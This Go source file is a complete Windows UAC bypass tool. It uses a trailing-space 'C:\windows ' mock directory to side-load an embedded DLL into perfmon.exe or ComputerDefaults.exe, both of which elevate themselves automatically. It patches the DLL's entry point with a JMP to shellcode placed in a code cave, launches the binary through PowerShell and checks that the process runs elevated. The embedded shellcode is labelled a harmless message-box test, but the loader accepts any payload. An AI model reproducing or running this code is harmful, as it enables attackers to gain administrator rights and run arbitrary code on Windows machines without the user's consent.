package main

import (
	_ "embed"
	"flag"
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"
	"github.com/Binject/debug/pe"
)

//go:embed atl.dll
var atlDLL []byte

//go:embed propsys.dll
var propsysDLL []byte

type BypassMethod struct {
	Executable string
	DLLName    string
	DLLData    []byte
	ProcessName string
}

func main() {
	var method = flag.String("method", "perfmon", "Choose bypass method: 'perfmon' (uses atl.dll) or 'computerdefaults' (uses propsys.dll)")
	flag.Parse()

	var bypassMethod BypassMethod
	
	switch *method {
	case "perfmon":
		bypassMethod = BypassMethod{
			Executable:  "perfmon.exe",
			DLLName:     "atl.dll",
			DLLData:     atlDLL,
			ProcessName: "perfmon",
		}
		fmt.Println("Using perfmon.exe with atl.dll")
	case "computerdefaults":
		bypassMethod = BypassMethod{
			Executable:  "ComputerDefaults.exe",
			DLLName:     "propsys.dll", 
			DLLData:     propsysDLL,
			ProcessName: "ComputerDefaults",
		}
		fmt.Println("Using ComputerDefaults.exe with propsys.dll")
	default:
		log.Fatalf("Invalid method '%s'. Use 'perfmon' or 'computerdefaults'", *method)
	}

	windir := `C:\windows `
	sys32dir := filepath.Join(windir, "system32")

	if err := os.Mkdir(`\\?\`+windir, 0755); err != nil && !os.IsExist(err) {
		log.Fatalf("Failed to create directory %s: %v", windir, err)
	}

	if err := os.Mkdir(`\\?\`+sys32dir, 0755); err != nil && !os.IsExist(err) {
		log.Fatalf("Failed to create directory %s: %v", sys32dir, err)
	}

	displacedDLLPath := filepath.Join(sys32dir, bypassMethod.DLLName)
	err := os.WriteFile(`\\?\`+displacedDLLPath, bypassMethod.DLLData, 0644)
	if err != nil {
		log.Fatalf("Failed to write embedded %s: %v", bypassMethod.DLLName, err)
	}

	legitExecutablePath := filepath.Join(os.Getenv("SystemRoot"), "System32", bypassMethod.Executable)
	newExecutablePath := filepath.Join(sys32dir, bypassMethod.Executable)

	executableBytes, err := os.ReadFile(legitExecutablePath)
	if err != nil {
		log.Fatalf("Failed to read %s: %v", bypassMethod.Executable, err)
	}

	if err := os.WriteFile(`\\?\`+newExecutablePath, executableBytes, 0755); err != nil {
		log.Fatalf("Failed to write %s: %v", bypassMethod.Executable, err)
	}
	fmt.Println("Created directories and copied files.")

	shellcode := getEmbeddedShellcode()
	fmt.Printf("Using embedded shellcode (%d bytes)\n", len(shellcode))

	fmt.Printf("Patching %s with debug/pe...\n", bypassMethod.DLLName)
	
	if err := patchDLLWithShellcode(`\\?\`+displacedDLLPath, shellcode); err != nil {
		log.Fatalf("Failed to patch DLL: %v", err)
	}

	fmt.Printf("Successfully patched %s with new section.\n", bypassMethod.DLLName)

	if _, err := os.Stat(`\\?\` + newExecutablePath); err != nil {
		log.Fatalf("%s not found at expected location: %v", bypassMethod.Executable, err)
	} else {
		fmt.Printf("%s found in trailing space directory\n", bypassMethod.Executable)
	}
	
	if _, err := os.Stat(`\\?\` + displacedDLLPath); err != nil {
		log.Fatalf("%s not found at expected location: %v", bypassMethod.DLLName, err)
	} else {
		fmt.Printf("%s found in trailing space directory\n", bypassMethod.DLLName)
	}

	executableInfo, _ := os.Stat(`\\?\` + newExecutablePath)
	dllInfo, _ := os.Stat(`\\?\` + displacedDLLPath)
	fmt.Printf("%s size: %d bytes\n", bypassMethod.Executable, executableInfo.Size())
	fmt.Printf("%s size: %d bytes\n", bypassMethod.DLLName, dllInfo.Size())

	fmt.Printf("\n[+] Executing %s from trailing space directory [+]\n", bypassMethod.Executable)
	fmt.Printf("Executing: %s\n", newExecutablePath)
	
	cmd := exec.Command("powershell", "-c", "Start-Process", "'"+newExecutablePath+"'")
	
	if err := cmd.Start(); err != nil {
		log.Fatalf("Failed to execute %s: %v", bypassMethod.Executable, err)
	}
    time.Sleep(3 * time.Second)
	
	fmt.Printf("\n[+] Checking %s elevation status [+]\n", bypassMethod.Executable)
	err = checkProcessElevation(bypassMethod.ProcessName)
	if err != nil {
		fmt.Printf("Error checking %s elevation: %v\n", bypassMethod.ProcessName, err)
	}
	
	fmt.Println("UAC bypass complete")
}

func checkProcessElevation(processName string) error {
	psCommand := fmt.Sprintf(`Get-Process | Add-Member -Name Elevated -MemberType ScriptProperty -Value {if ($this.Name -in @('Idle','System')) {$null} else {-not $this.Path -and -not $this.Handle} } -PassThru | Where-Object {$_.Name -eq '%s'} | Format-Table Name,Elevated -AutoSize`, processName)
	
	cmd := exec.Command("powershell", "-c", psCommand)
	output, err := cmd.Output()
	if err != nil {
		return fmt.Errorf("failed to run PowerShell command: %v", err)
	}
	
	result := string(output)
	fmt.Printf("PowerShell elevation check result:\n%s", result)
	lines := strings.Split(result, "\n")
	for _, line := range lines {
		if strings.Contains(strings.ToLower(line), strings.ToLower(processName)) {
			if strings.Contains(strings.ToLower(line), "true") {
				fmt.Printf("SUCCESS: %s is running elevated\n", processName)
				return nil
			} else if strings.Contains(strings.ToLower(line), "false") {
				fmt.Printf("%s is running but NOT elevated\n", processName)
				return nil
			}
		}
	}
	
	fmt.Printf(" %s process not found or elevation status unclear\n", processName)
	return nil
}

func patchDLLWithShellcode(dllPath string, shellcode []byte) error {
	fmt.Printf("Patching DLL with shellcode injection...\n")

	originalBytes, err := os.ReadFile(dllPath)
	if err != nil {
		return fmt.Errorf("failed to read original file: %v", err)
	}

	file, err := pe.Open(dllPath)
	if err != nil {
		return fmt.Errorf("failed to open PE file: %v", err)
	}
	defer file.Close()

	requiredSize := len(shellcode) + 10
	fmt.Printf("Looking for code cave of at least %d bytes...\n", requiredSize)

	// Try to find suitable section and code cave
	sectionInfo, caveOffset := findBestCodeCave(file, requiredSize)
	if sectionInfo == nil {
		return fmt.Errorf("could not find suitable code cave for shellcode in any section")
	}

	fmt.Printf("Selected %s section at RVA 0x%x, size: %d\n", sectionInfo.Name, sectionInfo.VirtualAddress, sectionInfo.Size)
	fmt.Printf("Found code cave at offset 0x%x in %s section\n", caveOffset, sectionInfo.Name)

	fileOffset := int(sectionInfo.Offset) + caveOffset
	
	copy(originalBytes[fileOffset:], shellcode)
	
	fmt.Printf("Patched shellcode at file offset 0x%x\n", fileOffset)

	var entryPoint uint32
	if file.OptionalHeader != nil {
		switch oh := file.OptionalHeader.(type) {
		case *pe.OptionalHeader32:
			entryPoint = oh.AddressOfEntryPoint
		case *pe.OptionalHeader64:
			entryPoint = oh.AddressOfEntryPoint
		}
	}

	entryPointFileOffset := rvaToFileOffset(file, entryPoint)
	if entryPointFileOffset == -1 {
		return fmt.Errorf("could not find entry point in file")
	}

	shellcodeRVA := sectionInfo.VirtualAddress + uint32(caveOffset)
	
	fmt.Printf("Entry point at file offset 0x%x, shellcode RVA: 0x%x\n", entryPointFileOffset, shellcodeRVA)

	jumpInstruction := createRelativeJump(entryPoint, shellcodeRVA)
	
	fmt.Printf("Created jump instruction: %x\n", jumpInstruction)

	copy(originalBytes[entryPointFileOffset:], jumpInstruction)

	if err := os.WriteFile(dllPath, originalBytes, 0644); err != nil {
		return fmt.Errorf("failed to write modified PE file: %v", err)
	}

	fmt.Printf("Successfully patched DLL with shellcode injection\n")
	return nil
}

func findBestCodeCave(file *pe.File, minSize int) (*pe.Section, int) {
	preferredSections := []string{".text", ".rdata", ".data", ".rsrc"}
	
	fmt.Printf("Analyzing sections for code caves...\n")
	
	for _, sectionName := range preferredSections {
		section := findSection(file, sectionName)
		if section != nil {
			fmt.Printf("Checking %s section (RVA: 0x%x, Size: %d, Characteristics: 0x%x)\n", 
				section.Name, section.VirtualAddress, section.Size, section.Characteristics)
			
			if offset := analyzeSection(section, minSize); offset != -1 {
				return section, offset
			}
		}
	}
	
	fmt.Printf("Preferred sections exhausted, checking all sections...\n")
	for _, section := range file.Sections {
		isPreferred := false
		for _, preferred := range preferredSections {
			if section.Name == preferred {
				isPreferred = true
				break
			}
		}
		if isPreferred {
			continue
		}
		
		fmt.Printf("Checking %s section (RVA: 0x%x, Size: %d, Characteristics: 0x%x)\n", 
			section.Name, section.VirtualAddress, section.Size, section.Characteristics)
		
		if offset := analyzeSection(section, minSize); offset != -1 {
			return section, offset
		}
	}
	
	return nil, -1
}

func analyzeSection(section *pe.Section, minSize int) int {
	data, err := section.Data()
	if err != nil {
		fmt.Printf("   Could not read %s section data: %v\n", section.Name, err)
		return -1
	}
	
	// Try different cave finding strategies
	strategies := []struct {
		name string
		finder func([]byte, int) int
	}{
		{"consecutive zeros", findConsecutiveZeros},
		{"sparse zeros", findSparseZeros},
		{"padding pattern", findPaddingPattern},
		{"end padding", findEndPadding},
	}
	
	for _, strategy := range strategies {
		if offset := strategy.finder(data, minSize); offset != -1 {
			fmt.Printf("   Found cave using '%s' strategy at offset 0x%x\n", strategy.name, offset)
			return offset
		} else {
			fmt.Printf("   No cave found using '%s' strategy\n", strategy.name)
		}
	}
	
	return -1
}

func findConsecutiveZeros(data []byte, minSize int) int {
	consecutiveZeros := 0
	for i, b := range data {
		if b == 0 {
			consecutiveZeros++
			if consecutiveZeros >= minSize {
				return i - consecutiveZeros + 1
			}
		} else {
			consecutiveZeros = 0
		}
	}
	return -1
}

func findSparseZeros(data []byte, minSize int) int {
	// Look for areas with mostly zeros (80% or more)
	windowSize := minSize
	if windowSize > len(data) {
		return -1
	}
	
	for i := 0; i <= len(data)-windowSize; i++ {
		zeroCount := 0
		for j := i; j < i+windowSize; j++ {
			if data[j] == 0 {
				zeroCount++
			}
		}
		
		if float64(zeroCount)/float64(windowSize) >= 0.8 {
			return i
		}
	}
	return -1
}

func findPaddingPattern(data []byte, minSize int) int {
	// Look for common padding patterns (0x00, 0xCC, 0x90)
	patterns := []byte{0x00, 0xCC, 0x90}
	
	for _, pattern := range patterns {
		consecutive := 0
		for i, b := range data {
			if b == pattern {
				consecutive++
				if consecutive >= minSize {
					return i - consecutive + 1
				}
			} else {
				consecutive = 0
			}
		}
	}
	return -1
}

func findEndPadding(data []byte, minSize int) int {
	// Check if there's enough space at the end of the section
	if len(data) < minSize {
		return -1
	}
	
	// Look for trailing padding
	endStart := len(data) - minSize
	zeroCount := 0
	
	for i := endStart; i < len(data); i++ {
		if data[i] == 0 || data[i] == 0xCC {
			zeroCount++
		}
	}
	
	if float64(zeroCount)/float64(minSize) >= 0.7 {
		return endStart
	}
	
	return -1
}

func findSection(file *pe.File, name string) *pe.Section {
	for _, section := range file.Sections {
		if section.Name == name {
			return section
		}
	}
	return nil
}

func rvaToFileOffset(file *pe.File, rva uint32) int {
	for _, section := range file.Sections {
		if rva >= section.VirtualAddress && rva < section.VirtualAddress+section.VirtualSize {
			return int(section.Offset + (rva - section.VirtualAddress))
		}
	}
	return -1
}

func createRelativeJump(fromRVA, toRVA uint32) []byte {
	offset := int32(toRVA) - int32(fromRVA) - 5
	
	return []byte{
		0xE9, // JMP rel32
		byte(offset),
		byte(offset >> 8),
		byte(offset >> 16),
		byte(offset >> 24),
	}
}

func uint32ToBytes(val uint32) []byte {
	return []byte{
		byte(val),
		byte(val >> 8),
		byte(val >> 16),
		byte(val >> 24),
	}
}

func uint64ToBytes(val uint64) []byte {
	return []byte{
		byte(val),
		byte(val >> 8),
		byte(val >> 16),
		byte(val >> 24),
		byte(val >> 32),
		byte(val >> 40),
		byte(val >> 48),
		byte(val >> 56),
	}
}

func align(size, alignment, base uint32) uint32 {
	if alignment == 0 {
		return base + size
	}
	if size%alignment == 0 {
		return base + size
	}
	return base + ((size/alignment)+1)*alignment
}

// messagebox shellcode :3
func getEmbeddedShellcode() []byte {
	hexString := "4883ec284883e4f0488d1566000000488d0d52000000e89e0000004c8bf8488d0d5d000000ffd0488d155f000000488d0d4d000000e87f0000004d33c94c8d0561000000488d154e0000004833c9ffd0488d1556000000488d0d0a000000e8560000004833c9ffd04b45524e454c33322e444c4c004c6f61644c69627261727941005553455233322e444c4c004d657373616765426f784100636172766564202D206869004d657373616765004578697450726f63657373004883ec28654c8b0425600000004d8b40184d8d60104d8b0424fc498b7860488bf1ac84c074268a2780fc617c0380ec203ae0750848ffc748ffc7ebe54d8b004d3bc475d64833c0e9a7000000498b5830448b4b3c4c03cb4981c188000000458b294d85ed75084833c0e9850000004e8d042b458b71044d03f5418b4818458b50204c03d3ffc94d8d0c8a418b394803fb488bf2a675088a0684c07409ebf5e2e64833c0eb4e458b48244c03cb66418b0c49458b481c4c03cb418b0489493bc57c2f493bc6732a488d3418488d7c24304c8be7a4803e2e75faa4c707444c4c00498bcc41ffd7498bcc488bd6e914ffffff4803c34883c428c3"

	bytes := make([]byte, len(hexString)/2)
	for i := 0; i < len(hexString); i += 2 {
		b, _ := strconv.ParseUint(hexString[i:i+2], 16, 8)
		bytes[i/2] = byte(b)
	}
	return bytes
}
